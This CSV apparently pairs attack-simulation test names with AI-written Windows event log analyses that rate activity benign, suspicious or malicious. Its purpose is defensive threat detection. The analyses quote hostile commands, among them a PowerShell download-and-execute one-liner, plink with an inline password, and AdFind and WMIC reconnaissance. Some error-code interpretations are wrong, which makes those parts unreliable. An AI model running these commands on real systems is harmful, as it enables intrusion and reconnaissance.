Directory Name,AI Response
Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy,"Based on the logs provided, here is a detailed analysis of potential malicious activity:

### Windows PowerShell Log Analysis

- The PowerShell logs primarily show activities involving the `get-addefaultdomainpasswordpolicy` command. This command can be used to retrieve the Active Directory default domain password policy. While usage of such commands is typical for administrative purposes, their execution should be properly authorized and accounted for, especially if run on sensitive systems.
- There is no indication of abnormal behavior within these logs, such as unexpected or complex command execution that might suggest malicious intent. The absence of additional PowerShell logging detail (such as downloaded scripts, obfuscation, or execution flags) leans toward benign usage.

### System Log Analysis

- The system logs reveal some standard operations including time synchronization activities mainly by `svchost.exe`, which are common and typically not suspicious unless manipulated for time-based attacks.
- The time discrepancy correction in the logs is not uncommon and is likely due to normal time synchronization processes within Windows environments.

### Sysmon Log Analysis

- Sysmon logs record file executions for standard Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. These utilities do not appear to be run with unusual parameters and have a high integrity level which suggests they were likely run by an administrator or automation script.
- The execution of `whoami.exe` and `hostname.exe` may indicate a user checking for credentials or system information. Although typical, contexts where these commands could be used signal an anomaly if repeated suspiciously.
- The use of PowerShell (`powershell.exe`) recorded in Sysmon logs reflects the same actions noted in the PowerShell log, focusing on retrieving domain policies. Given the absence of complex scripts or obfuscation techniques, no immediate sign of malware execution is evident.

### Security Log Analysis

- Security logs indicate Windows time synchronization events (`EventID 4616`) initiated by a service account, not implying direct user manipulation or privilege abuse.

### Application Log Analysis

- The application log shows a benign entry related to the Software Protection Platform Service, which appears to be routine and does not suggest unusual behavior.

### Summary and Assessment

The provided event logs show a series of administrative and system activities that do not appear inherently malicious. Here is the resolution based on the analyzed logs:

- **BENIGN**: The activities within the PowerShell, system, sysmon, security, and application logs, such as registry operations, execution of key Windows utilities, and time synchronization activities, align with typical IT administrative tasks without clear indicators of compromise or threatening behavior. There is no suspicious or unauthorized activity recognized in the logs that would require urgent follow-up beyond ensuring responsible logging and monitoring of administrative actions.

**Guidance on Proceeding**:
- While current logs suggest normal behavior, continuous monitoring should be maintained, particularly on the usage of PowerShell commands and activities by privileged users.
- Ensure that user access and PowerShell activity policies enforce least-privilege and are compliant with security standards.
- Confirm that security logging and alerting mechanisms are properly configured to detect and respond to abnormal behaviors promptly."
WinPwn - generaldomaininfo,"Upon analyzing the provided Windows event logs, here's a detailed analysis focusing on suspicious or anomalous behavior observed:

### Security Log
- The logs related to `svchost.exe` changing system time (EventID 4616) are typically associated with legitimate time synchronization activities or system time adjustments. There is no apparent indication of malicious activity based solely on these entries.

### Windows PowerShell Log
- The recurring PowerShell event (EventID 600) where a script is being downloaded and executed directly from a GitHub repository is concerning. This particular behavior, using `iex(new-object net.webclient).downloadstring(...)`, is a common tactic used in living-off-the-land attacks and can be indicative of a script being executed without downloading it permanently, which could be an attempt to evade detection and logging.
- The script execution and the reference to an arbitrary domain without a preceding indication that this was a pre-approved or IT-initiated script raises red flags for potential malicious intentions.

### Application Log
- The Windows Defender is continuously active (`SECURITY_PRODUCT_STATE_ON`), which suggests an active antivirus presence at the moment logged.
- Other entries regarding Security-SPP and EdgeUpdate services appear routine and align with standard update processes and checks.

### System Log
- Observations in the system log, such as time synchronization with an NTP server, are standard operations seen in typical system logs.

### Sysmon Log
- The Sysmon logs capture a detailed tracing of process activities.
- Of particular concern is the repeated execution of `powershell.exe` with the command line indicating the `iex(new-object net.webclient).downloadstring(...)` function, reinforcing the abnormal script execution noted in the PowerShell logs.
- Frequent executions and interactions of command line interpreters within a high-privilege context by the user `admin_test` without documentation of administrative tasks can be suspicious if not explicitly authorized.
- The repeated noted use of utility and system binaries like `wevtutil.exe`, `conhost.exe`, potentially to manage or tamper logged events, if not a routine administrative task, can indicate an attempt to cover tracks.

### Conclusion

Based on the available evidence, there are strong suspicions of unexpected and potentially harmful script execution from an unauthorized source, indicative of malicious activity, particularly focused on the observed PowerShell behavior. The PowerShell events highlight a classic initial vector for script-based attacks which could be launching further payloads or recon activities.

### Resolution: MALICIOUS
- **Threat/Risks Identified**: Unauthorized script execution potentially introducing or executing malicious payloads could compromise system integrity, data privacy, or be part of a larger attack campaign.
- **Guidance**: Immediate actions include blocking the domain used in the script execution, performing a comprehensive security scan, and reviewing IT policies related to script execution. Detailed investigation into any files or processes initiated by this script should be performed to mitigate any ongoing threats."
ESXi - VM Discovery using ESXCLI,"Upon reviewing the provided Windows event logs, several aspects of activity can be noted, leading to an identification of potentially suspicious activity that warrants further investigation.

### Detailed Analysis:

1. **Windows Security Log – Security Audits:**
   - Event ID 4672 indicates that special privileges were assigned to the SYSTEM account, which is standard but could be leveraged by malicious software to elevate privileges. Events 4624 and 4672 mostly involve SYSTEM or trusted accounts, which in a secure environment, would not alone denote malicious activity. 
   - Event IDs 4798 indicate attempts to enumerate the local accounts, utilizing `taskhostw.exe`. These account enumerations might not be typically expected under normal operating conditions, especially in rapid succession, and from processes that usually do not spawn such queries.

2. **Sysmon Logs – Process Creation and Network Connections:**
   - The Sysmon logs reveal the execution of `plink.exe`, a command-line network tool, using credentials (`-ssh -l ""root"" -pw ""pass""`) to connect to an external machine, `file.local`. This is indeed suspicious as `plink.exe` could be utilized for tunneling commands or transferring data stealthily to remote servers. Such usage is indicative of potential lateral movement or data exfiltration attempts.
   - The PowerShell execution and the high integrity level assigned to these processes enhance the potential risk, suggesting an intended or unintended use of administrative capabilities.

3. **General Observations:**
   - Repeated command line executions involving `powershell.exe`, `whoami.exe`, `hostname.exe`, and `cmd.exe` indicate a level of interaction with the system that could be indicative of manual operations or script-driven monitoring, which in totality could signify either administrative actions or malicious activities monitoring the host.
   - Multiple attempts to access credentials through logs mistargeted or potentially failed authentication attempts (`Event ID 5379` with error code `3221226021`). These repetitive credential access attempts are non-standard and could suggest attempts by an adversary to brute force or retrieve legitimate account details.

### Assessment:

The combination of these events demonstrates patterns that are commonly associated with attacker techniques, including but not limited to:
- Possible reconnaissance and credential enumeration (`Event ID 4798`).
- Potential lateral movement or data exfiltration (`plink.exe` usage).
- The execution of high-privileged PowerShell and other command-line tools for possible malicious intent.

### Resolution:

**SUSPICIOUS**

While no definitive indicator confirms a compromise 100%, the aggregation of these patterns deemed atypical of regular system operations suggests that further investigation is necessary. Actions such as isolating the system, validating administrative activities, and reviewing network communications for unauthorized activities are recommended to ascertain the integrity and security of the host."
WinPwn - printercheck,"Upon thorough examination of the provided Windows event logs, the following analysis and conclusions have been drawn:

1. **PowerShell Execution:**
   - The Sysmon logs show an execution of `powershell.exe` with a command line that includes downloading and executing a script from a GitHub URL. This is concerning as it can potentially indicate unauthorized script execution, potentially used for malicious purposes, such as downloading additional malware or executing harmful commands.
   - The specific command line is:
     ```
     ""powershell.exe"" & {$script_repo='https://raw.githubusercontent.com/script', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'), printercheck -noninteractive -consoleoutput}
     ```
   - This pattern is commonly used in attacks exploiting PowerShell to covertly download and execute code from the internet. 

2. **Use of Windows Utilities:**
   - `wevtutil.exe` and `conhost.exe` are observed executing multiple times. While these utility executions can be legitimate, they may also indicate attempts by an attacker to clear logs or execute malicious commands under the guise of normal utilities.
   - Frequent and automated execution of system utilities, particularly by the same user (`admin_test`), might indicate either scripted administrative actions or potentially malicious automated scripts.

3. **Integrity Level:**
   - The integrity level of the PowerShell process is marked as ""High"", suggesting it has elevated privileges. This can pose significant risk if the script being executed is malicious.

4. **Application and System Logs:**
   - There are several Microsoft Edge Update events. These appear to be routine update checks and operations by the system.
   - The Security and System logs show synchronization activities and time adjustments, which are typical operations and do not suggest anomalies.

5. **Process Executions:**
   - Numerous benign processes like `HOSTNAME.EXE`, `whoami.exe`, and various Edge Update processes executed by the `NT AUTHORITY\SYSTEM` user indicate regular system operations. These do not hint at malicious activity in isolation.

**Assessment:**
- **SUSPICIOUS:** The execution of PowerShell with a command line that downloads and executes a script from an unknown or non-standard source raises a considerable red flag for potential malicious activity. Although the evidence doesn't conclusively prove malicious intent without further context, it warrants further investigation as to why and how this script was executed.

**Guidance:**
1. **Immediate Action:**
   - Review and verify the purpose and legitimacy of the PowerShell script being downloaded. Check if any authorized personnel were aware of or initiated this.
   - Inspect the GitHub repository and script content for potential malicious code or behavior.

2. **Further Investigation:**
   - Audit and analyze user activities associated with `SERVER002\admin_test` around the time of the logs.
   - Review the network logs to check for any anomalous outbound connections or data transfer that may correspond with the script execution.

3. **Recommend Preventative Measures:**
   - Implement stricter auditing and monitoring of PowerShell usage, consider using script block logging.
   - Apply application whitelisting to prevent unauthorized script execution.
   - Regularly update and patch systems to guard against exploitation of known vulnerabilities.

Conclusively, while several entries suggest benign system operations, the PowerShell activity is particularly concerning and should be investigated further to ascertain its intention and prevent potential compromise."
Security Software Discovery - AV Discovery via WMI,"Upon reviewing the provided Windows event logs, the following observations are noted regarding suspicious or anomalous behavior:

1. **Security Logs:**
   - Event ID 4616 indicates system time changes being made by the `svchost.exe` process. While time adjustments might be legitimate (e.g., synchronization with an NTP server via `time.windows.com`), frequent and unusual time changes could indicate an attempt to hinder or manipulate log file accuracy.

2. **Sysmon Logs:**
   - There are several executions of the `wevtutil.exe` process, usually used for querying and managing Windows event logs. Repeated calls to `wevtutil.exe` without clear context or task could indicate a log manipulation attempt, potentially by an adversary covering their tracks.
   - Commands such as `whoami.exe` and `hostname.exe` were executed, both typical for system reconnaissance. This by itself isn't inherently malicious but could be used in preliminary attack steps.
   - A `cmd.exe` instance was executed with the command `wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List`. WMIC usage in this manner can be part of system reconnaissance to check for installed antivirus products, potentially as part of an evasive technique before executing further attacks.

3. **System Logs:**
   - Similar to the security logs, there are consistent time change records related to the `svchost.exe` process. Consistency in these events occurring together across logs merits additional scrutiny to confirm whether these are standard operational behaviors or indications of time-tampering.

**Assessment and Conclusion:**
Several sequences of behavior suggest activities typical in reconnaissance or preparing for advanced stages of exploitation—particularly in querying antivirus status and consistent interactions with event logs via `wevtutil.exe`. The execution of multiple system commands like `whoami`, `hostname`, and time adjustments further reinforce potential anomalous behavior, which could be suspicious if the context around these actions isn't adequately justified by normal administrative or automated tasks.

**Resolution: SUSPICIOUS**

This analysis finds the activities within the logs suspicious. They warrant further investigation to determine if these actions were authorized and required as part of legitimate administrative processes. It is crucial to review context, such as possible maintenance schedules or administrative tasks, and verify any associated user activities during this timeframe.

**Guidance on How to Proceed:**
- Review and verify any administrative tasks or schedules that could legitimize these operations.
- Conduct interviews with any users or administrators associated with the `admin_test` user account for confirmation of legitimate activities.
- Enhance monitoring for high-integrity level processes and command-line executions.
- Consider employing additional controls, such as AppLocker or enhanced logging configurations, to gain better visibility and control over command-line usage and event log interactions."
File and Directory Discovery (cmd.exe),"After analyzing the provided log entries, here are my findings:

**System Log:**
- The time sync events (EventID `24`, `1` in the System log) from ""svchost.exe"" are typical behaviors for time adjustments and synchronization. Adjustments are minor and appear to correlate closely with known time services (""time.windows.com""). These logs do not present any indication of malicious time tampering.
- Updates via the Microsoft-Windows-UpdateClient appear legitimate, and updates are consistent with typical system update activities.

**Application Log:**
- Logs related to the Software Protection Platform Service (Microsoft-Windows-Security-SPP) and Windows Defender (SecurityCenter) show expected operation and logging without significant issues.
- Entries related to ""edgeupdate"" stopping and starting are typical for Microsoft Edge’s update process.

**Sysmon Log:**
- Execution of normal system utilities like ""whoami.exe"", ""conhost.exe"", ""wsmprovhost.exe"", ""svcchost.exe"", etc., are consistent with routine system operations.
- A series of ""EdgeUpdate"" activities are logged, indicating Microsoft Edge updates, which are expected and align with legitimate update processes.
- Nonetheless, the entry for ""cmd.exe"" running with a series of `dir /s` commands to write to a file is slightly suspicious. This could indicate reconnaissance behavior if not initiated intentionally by an administrator. It suggests a potential local enumeration of directories and files, which could be a precursor to data exfiltration or analysis.
- ""wevtutil.exe"", a legitimate tool to query Event Logs, is run multiple times but only under the context of a normal user. If malicious, it could signify attempts to clear logs or gather log data stealthily.
  
**Security Log:**
- Numerous logon entries related to service accounts and SYSTEM processes are noted, which generally appear legitimate.
- The EventID `4672` showed elevated privileges being assigned to normal system services, which is customary.

**Summary & Resolution:**
- **Benign Activities:** Most activities logged such as system updates, time synchronization, and taskhost-related specific entries align with regular system operations.
- **Suspicious Behavior:** The ""cmd.exe"" command with directory listings and file generation in a temp directory needs review to confirm if it was performed by an authorized user. This does not directly indicate malicious activity but can warrant closer monitoring or investigation.

**Resolution: SUSPICIOUS**
- Due to the suspicious nature of the ""cmd.exe"" execution for directory enumeration, it is recommended to review any user actions or scripts that may have executed it to confirm legitimacy. Investigating admin_test’s actions could clarify intent without assuming malicious actions without further evidence. It suggests a potential probing or data collection activity.
- If unverifiable or recurrent, it would be prudent to increase logging on script executions and alert on similar activities moving forward.
"
System Time Discovery W32tm as a Delay,"Upon reviewing the provided Windows event logs, here is a detailed analysis:

### Analysis Summary:

1. **Time Synchronization Events (Event ID 4616 in Security Logs and corresponding Sysmon and Kernel Events):**
   - There are entries indicating that the system time has been adjusted. This is captured typically by Event ID 4616 for time change events and corresponding Sysmon and Kernel events indicating the process responsible (`svchost.exe` in this case). 
   - The time adjustment seems minor and is handled by the Local Service, a normal process on Windows systems.

2. **Whoami, Conhost, and W32tm Processes (Sysmon Logs):**
   - Execution of `whoami.exe`, `conhost.exe`, and `w32tm.exe` by the user `admin_test` with a high integrity level. 
   - `whoami.exe` is a benign utility to check the current user context and is often used in scripting or troubleshooting.
   - `w32tm.exe` is typically related to time services management, and its usage in conjunction with time synchronization makes it seem part of legitimate system management tasks.

3. **Microsoft Edge Update Activity:**
   - There are multiple references to `MicrosoftEdgeUpdate.exe` with commands like `/update`, `/regsvc`, `/regserver`, etc. This indicates legitimate update activities for Microsoft Edge.
   - The associated processes are signed by Microsoft and run by `NT AUTHORITY\SYSTEM`, reflecting a common pattern encountered during legitimate software updates.

4. **EdgeUpdate Services:**
   - Application logs indicate the edge update service stopping at different times. This could be routine depending on the update cycle or installation parameters.
  
5. **Command-Line Execution (Sysmon ID 1):**
   - Execution of `cmd.exe` with parameters for `w32tm` as part of the standard command prompt actions when managing time settings.
   - The command sets and displays time synchronization status, adding to the evidence that this is a maintenance-related task and not necessarily an indicator of compromise.

### Assessment:

- **Benign Process Execution:**
  - Tools like `whoami` and `w32tm` are standard and can be a part of regular system administration tasks.
  - Modifications in system time observed are facilitated through standard Windows processes (`svchost.exe`) and are consistent with legitimate actions.

- **Software Updates:**
  - The activity surrounding the Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) represents an expected automated update mechanism in action. This is apparent from the paths, associated actions, and lack of foreign or suspicious command-line arguments.

### Conclusion:

Based on the detailed review of the logs, no clear indicators of malicious activity or compromise were found. Instead, the events collectively suggest regular system administrative tasks and routine software updates.

**Resolution: BENIGN**

**Guidance:**
- No further immediate action is required. Continue monitoring for any irregular or non-recognized activities.
- Ensure that the system and associated software updates are governed by a legitimate central management approach, i.e., WSUS or another update management service.
- Maintain regular logging and monitoring to promptly detect any deviations from expected behavior."
Adfind - Query Active Directory Groups,"### Detailed Analysis of Logs:

#### Security Log Analysis:
1. **EventID 4624 (Logon) and 4672 (Special privileges assigned):**
   - **EventID 4624:** Indicates a successful system logon. The logon type is `5`, which specifies a service logon, typically used by services installed on the computer to run at the default system credential level.
   - **EventID 4672:** Special privileges are assigned to a new logon. These privileges include `SeDebugPrivilege`, which is often used by various administrative and system maintenance tools. The user in question (`NT AUTHORITY\SYSTEM`) is running with high privilege, but this is not unusual as the SYSTEM account often requires elevated privileges for legitimate purposes.

   **Assessment:** This behavior is considered typical for systems running services under the SYSTEM account, especially on servers. There is no evidence of privilege escalation beyond expected behavior.

#### Application Log Analysis:
1. **Windows Defender:**
   - The two entries indicate that Windows Defender is active and running without any alerts or state changes, which implies standard protection status on the host.

   **Assessment:** These are routine logs indicating the security product is functioning normally. No signs of malicious activity here.

#### Sysmon Log Analysis:
1. **EventID 1 (Process Creation) and 5 (Process Termination):**
   - Windows processes such as `SecurityHealthService.exe`, `powershell.exe`, `cmd.exe`, `wevtutil.exe`, and `whoami.exe` are being executed by the user `SERVER002\\admin_test`.
   - Noteworthy is the execution of `AdFind.exe` through `cmd.exe` located in a user’s temp directory, which is suspicious as `AdFind.exe` is a known tool for Active Directory enumeration.
   - The presence of `powershell.exe` without command-line arguments is often seen in legitimate uses, but it can be an indicator of potentially suspicious activity depending on the context.
   - Multiple `conhost.exe` instances spawned, following known utilities such as `cmd.exe` and `powershell.exe`, fit within normal behavior when these utilities are used to interface or run console applications.
   
   **Assessment:** The presence of `AdFind.exe` suggests potential reconnaissance activity, which deviates from standard operational tasks a system administrator might perform without clear documentation or approval of use. The use of this tool, combined with the lack of specific command-line arguments in the `powershell` activity, raises a red flag.

### Conclusion and Guidance:

- **Resolution:** **SUSPICIOUS**
  
  The execution of `AdFind.exe`, a tool used for Active Directory enumeration, combined with executions of `powershell` and other tools without arguments visible, points towards potentially unauthorized reconnaissance or preparatory steps for lateral movement. While other events and transactions appear normal, this deviation warrants further investigation.

### Suggested Actions:
1. **Immediate Investigation:** 
   - Determine the origin and intent of the `AdFind.exe` execution. Check the history and ownership of the file path and validate with the administrative team if its use was authorized.
   - Review PowerShell transcript logs and script logs (if enabled) for any hidden or suspicious activities.
   - Analyze the overall system for other behavioral indicators of compromise, focusing on lateral movement and persistence mechanisms.

2. **Enhance Monitoring:**
   - Enable or extend logging for PowerShell execution and network connections.
   - Strengthen alerting on the use of non-standard or potentially malicious utilities like `AdFind.exe`.

3. **User Awareness and Training:**
   - Conduct additional training or reminders about approved tools and operations within the network. Emphasize on recognizing potential Recon activities and typical workflows.

This level of insight enhances awareness and can help pinpoint potentially malicious or policy-violative actions for higher assurance in security operations."
Hostname Discovery (Windows),"Upon reviewing the supplied Windows Event Logs, I conducted a thorough analysis across the System, Sysmon, Security, and Application logs. My aim was to identify any anomalous or suspicious behavior that might indicate potential malicious activity. Below is a detailed breakdown of my findings:

### System Logs:
- The entries in the system logs primarily detail typical activities related to system time synchronization (`Microsoft-Windows-Time-Service`) and normal OS tasks executed by `svchost.exe`, a legitimate Windows process hosting services. 
- These logs reflect standard operating procedure with time adjustments and no indications of malicious tampering with system time which could indicate a timeline tampering attack often seen in intrusions.

### Sysmon Logs:
- The Sysmon logs reveal several process executions involving system processes such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, and `hostname.exe`. 
- These executions were performed by a user 'SERVER002\\admin_test' and seem related to administrative or diagnostic activities. There is no indication of scriptable or automated complex malicious behavior typically associated with malware or advanced threats.
- Processes like `Microsoft Edge Update` were frequent, coinciding with updates, indicated by paths and update-related arguments. This too appears consistent with a standardized system update process.

### Security Logs:
- These show two successful NTLM logins by the user 'admin_test' from `DESKTOP-3HL5B2P', noting privilege escalation (`SeSecurityPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, etc.). While escalated privileges should always be closely monitored, there is no evidence in other logs that these privileges were exploited for lateral movement, sensitive data access, or malicious configuration changes.
- Logon types and associated IP addresses are consistent with typical remote administrative access, with no direct signs of unauthorized or brute force access attempts.

### Application Logs:
- Events logged under `edgeupdate` indicate service stops, which align with background service updates or restarts typical of update installations. These match up with the expected Microsoft Edge update behavior and are normal post-update procedures.

### Conclusion
- **BENIGN**: The activities captured in these logs remain well within the expected operational behavior of Windows systems, particularly given the administrative context indicated by the processes and command-line arguments observed.
- There are no definitive signs of compromise, exploitation, or irregular network communications typically associated with malware presence or data exfiltration.

### Recommendations:
- **Monitoring**: Continue monitoring Windows Event Logs for unusual patterns, particularly on escalation of privileges or unusual IP addresses attempting access.
- **Review Administrative Access**: Ensure `admin_test` is a legitimate, authorized account and that its usage, especially from `DESKTOP-3HL5B2P`, aligns with operational standards.
- **Security Patches**: Regularly apply security patches and updates to services to minimize vulnerabilities.
- **Access Governance**: Re-evaluate permission schemas to mitigate risks from potential insider threats or inadvertently granted over-permissions.

Given the reviewed logs, no immediate security incidents need addressing. Next steps are to maintain vigilance with standard security best practices and auditing."
Reg query for AlwaysInstallElevated status,"### Analysis of Windows Event Logs

#### System Logs:
- The System logs reflect routine updates of the ""Security Intelligence Update for Microsoft Defender Antivirus."" The updates were successfully installed without errors, which is a benign activity typical for system maintenance.

#### Security Logs:
- The Security logs are consistently showing Event ID 5379, indicative of Credential Validation (or failure to validate credentials), specifically linked to MicrosoftAccount and WindowsLive, with multiple instances of return code 3221226021 (0xC000006D - STATUS_LOGON_FAILURE). 
- These events could indicate a failed attempt to access services using a domain account, possibly due to incorrect credentials.
  
#### Sysmon Logs:
- There are consistent logs indicating process creation of built-in Windows utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `reg.exe`).
- A specific command executed with `cmd.exe` using the AlwaysInstallElevated registry key queries is particularly interesting since this key can lead to privilege escalation if configured incorrectly. 
- The parent processes consistently trace back to legitimate system processes like `wsmprovhost.exe` running under SERVER002\admin_test, typical of administrative queries or scripts.

#### Application Logs:
- The Application log indicates that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), which is expected for a secured environment.

### Key Findings:
- **Credential Validation Failures**: Repeated failures (Event ID 5379) in the Security log are notable but might be a result of incorrect password during external service attempts, administrative maintenance scripts, or periodic attempts to access online services with outdated credentials.
- **AlwaysInstallElevated Registry Query**: The execution of `reg.exe` checking the AlwaysInstallElevated policies presents a risk if any of the registries were set to 1, as it would allow privileged installation rights to any user. However, the logs show only queries, not modification.
- **High Integrity Execution**: Multiple high-integrity level executions are rudimentary for administrative tasks but could hint at the presence of a scripted diagnostic check or maintenance script.

### Assessment:
- **Potential Risks**: The use of `cmd.exe` to query AlwaysInstallElevated settings could be an indicator of a security check or a potential precursor to privilege escalation if handled insecurely. However, no changes or exploits were evident from logs.
- **No Clear Malicious Activity**: The absence of new/unexpected file paths, changes to key registries, or non-standard application use suggests no confirmed malicious activities.

### Conclusion:
Based on the analysis of provided logs:
- **Resolution: SUSPICIOUS**
  
### Guidance to Proceed:
1. **Verification of Account Access**: Investigate whether the credential validation issues were expected or if other systems saw similar failures.
2. **Review Security Settings**: Confirm that the AlwaysInstallElevated registry settings are not configured to allow unintended privilege escalations.
3. **Confirm Legitimacy of Admin Actions**: Validate if `SERVER002\admin_test` is expected to perform such checks as part of automated scripts or maintenance tasks.
4. **Continuous Monitoring**: Maintain monitoring around processes that can influence privilege escalation and ensure robust logging for future audits."
Enumerate all accounts on Windows (Local),"Upon reviewing the details within the logs, here are the key observations:

### Application Log:
- Entry for the stopping of a service ""edgeupdate"" right before other events, which itself isn't inherently suspicious but indicates something related to Edge has ended.

### Sysmon Log:
- **EdgeUpdate Execution**: Repeated instances of MicrosoftEdgeUpdate.exe are executed. Some processes are run with high integrity, typical for update processes. However, due to the numerous, frequent executions of MicrosoftEdgeUpdate.exe with arguments such as `/regsvc`, `/ua`, and `/ping`, this could be a normal update or it could indicate something more mischievous if done unusually.
- **Command Execution**: The execution of `cmd.exe` with a complex command line (`cmd.exe /c net user ...`), captures system info, and checks users and credentials. Commands used in quick succession can be suspicious.
- **Permission Context**: Commands and processes are run under user `SERVER002\admin_test`, who has high integrity access, meaning actions on the system have broad access. While such actions could be linked to legitimate administrative work, their volume and timing suggest potential automated or scripted operations.

### Security Log:
- Event indicating accesses attempted by user `admin_test` have return codes indicative of possible access denial or failed operations.
  
### Suspicious Behavior:
- **Process Activities**: Numerous executions of command-line utilities (_cmd.exe, net.exe, net1.exe, cmdkey.exe_) are unusual when concentrated in such a short timeframe. This might suggest attempts at gathering system information or interacting with system/accounts settings.
- **Potential Enumeration**: The execution of processes that gather system and user information and check group memberships may indicate an enumeration phase by an attacker.

### Additional Considerations:
- Due to the frequency and range of commands observed (e.g., `whoami`, `net user`), further investigation is warranted to ensure they weren't initiated by poorly documented administrative scripts or overlooked automated tasks.
- Check other logs and system settings for indicators of how processes like MicrosoftEdgeUpdate.exe were initiated (scheduled tasks, policies, remote tools usage).

### Recommendation:
Based on the evidence from the logs, while there isn't a definitive sign of compromise, the large sequence of operations conducted rapidly by a single user warrants additional investigation. 

**Resolution: SUSPICIOUS**

Proceed with:
- Reviewing historical activity for the user `admin_test`.
- Correlating tasks from Task Scheduler or any automated scripts in use.
- Evaluating if there have been any recent changes approved to the systems or applications cited in the logs.
- Scanning for known indicators of compromise on EdgeUpdate exploits or general system irregularities."
Adfind - Enumerate Active Directory Computer Objects,"Upon reviewing the provided logs, there are several findings that stand out and require further analysis:

1. **Suspicious Use of AdFind.exe**:
    - In the Sysmon logs, there is an event showing the execution of `cmd.exe` with the following command line: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" -f (objectcategory=computer)`.
    - The use of AdFind.exe is commonly associated with enumeration activities often seen in post-exploitation scenarios, particularly by attackers aiming to gather information about Active Directory environments.
    - The file path is using a short name (8.3 filename format) and suggests it's being executed from a temporary location, which could indicate malicious intent or unauthorized use.

2. **Repeated Credential Access Failures**:
    - The Security log indicates repeated EventID 5379 entries. These are credential validation failures related to a ""MicrosoftAccount"", which might suggest an unauthorized attempt to access 
    - All attempts have a return code of `3221226021`, indicating that they were unsuccessful. This pattern could suggest either a misconfiguration or brute force attempt.

3. **Use of High Privileges**:
    - EventID 4672 in the Security log shows a logon session where special privileges were assigned, including `SeDebugPrivilege`, which can be abused for unauthorized activities.
    - Although such privileges can be normal for legitimate administrators, in the context of the rest of the activity, this should be reviewed further.

4. **Windows Defender is Active**:
    - The Application logs indicate that Windows Defender is turned on. However, there are no alerts or warnings, which suggests that if there was a compromise, it wasn't detected by the Defender. It should be ensured that definitions and updates are current and working effectively.

5. **Normal System Activity**:
    - The logs also contain ample evidence of normal system activity and windows updates, such as activities related to Windows Update processes, telemetry, and background services. These do not provide direct indicators of compromise.

After considering the activity found in these logs:

- **Resolution: SUSPICIOUS**

The presence of AdFind.exe being executed from a temp directory with potential enumeration activity combined with failed credential validation suggests activities that are uncommon for a regular system process or regular maintenance task. Additionally, the assigned high-level privileges could be used maliciously. Further investigation into the source and intent of these activities is necessary to rule out or confirm malicious behavior. You should:
- Conduct a comprehensive search for other instances or variations of AdFind.exe or similar software in use.
- Verify the legitimacy of the user accounts and their need for the levels of access seen.
- Ensure that all security software is up to date and perform deeper scans."
Enumerate All Network Shares with Snaffler,"The analysis of the provided Windows event logs reveals several suspicious activities, which can be highlighted as follows:

1. **PowerShell Activity:** There are multiple entries showing the execution of PowerShell commands that involve encoded command execution and the use of `invoke-expression`. The scripts appear to be stored in the user's Temp directory, which is unconventional for scripts that would normally have a legitimate purpose. The command includes:
   - `cmd /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe"" -a -o ""$env:temp\\datascriptOutput.txt""`.
   - The use of path traversal (i.e., `..\\`) could be an attempt to obfuscate the script's location or bypass certain restrictions, a technique sometimes used in malicious activity.
   - Encoded commands in PowerShell are often used to execute obfuscated scripts that might be performing malicious actions.

2. **Sysmon Activity:** There are multiple instances where PowerShell is seen as the parent process for various other commands (`cmd.exe`), demonstrating a potential hierarchy indicative of a script execution leading to other actions. The extensive use of both PowerShell and `cmd.exe` with encoded commands is abnormal for standard administrative activities and may indicate an attempt to hide the true nature of the executed commands.

3. **Privilege Escalation:** There are logs of an account `SERVER002\\admin_test` receiving sensitive privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.) which are typically unnecessary for regular user activities. The assignment of such privileges could be indicative of a potential security risk, especially if these were not part of a scheduled or expected activity.

4. **Network and Security Logs:** There is evidence of logon sessions initiated with `LogonType=3` which is indicative of a network logon. Coupled with the elevated privileges granted soon after, it raises concerns about unauthorized access potentially made over the network.

5. **Edge Update Activities:** Most of the Microsoft Edge update entries and related activities appear normal, but given the surrounding context of encoded and obfuscated script executions, they could potentially be leveraged as part of a larger attack chain unless confirmed as benign.

Overall, the combination of encoded PowerShell commands, the execution of scripts from unusual directories, elevated privileges, and network logon activity creates a profile that is suspicious. 

**Resolution:** SUSPICIOUS

**Recommendations:**
- Conduct a deeper forensic analysis of the specific system `Server002` to investigate the origin and intent of the PowerShell scripts.
- Review the account activities specifically for `SERVER002\\admin_test` to ensure these actions were authorized.
- Check network logs for any unusual inbound connections to `Server002` around the time the suspicious PowerShell activities were recorded.
- Temporarily isolate the system if necessary and conduct threat hunting activities across the network to identify whether this is an isolated case or part of a broader attack.
- Update antivirus signatures and scan the system for malware using robust detection mechanisms to ensure any potential malicious scripts are identified and removed."
Enumerate Active Directory Computers with ADSISearcher,"Based on the analysis of the provided Windows event logs, we can make the following observations and assessments regarding potential malicious activity:

### Observations:

1. **Windows PowerShell Logs:**
   - Multiple PowerShell events indicate that PowerShell was executed with a command aimed at querying the domain for objects of the category ""computer"". This could indicate reconnaissance activity if it was unexpected.

2. **Sysmon Logs:**
   - Multiple process creations involving built-in Windows tools such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `dmclient.exe`, `taskhostw.exe`, `wuauclt.exe`, and various Windows Update processes were logged.
   - None of these logs indicate unusual command-line arguments or unexpected parent-child process relationships that definitively suggest malicious behavior.
   - The processes appear mainly related to system maintenance (e.g., Windows Update, System Compatibility, Microsoft Edge Update).

3. **Security Logs:**
   - Lots of Event ID 5379 indicating credential validation attempts that failed (ReturnCode: 3221226021 corresponds to “No such number” or an access denied error), which can be a benign error during regular operations or a sign of misconfigured or failed attempts.
   - Privileged access (Event ID 4672) by `SYSTEM` is generally expected behavior but should be contextualized with activity to ensure no unauthorized escalation happened.

4. **System Logs:**
   - System logs show updates for Microsoft Defender Antivirus and related processes.
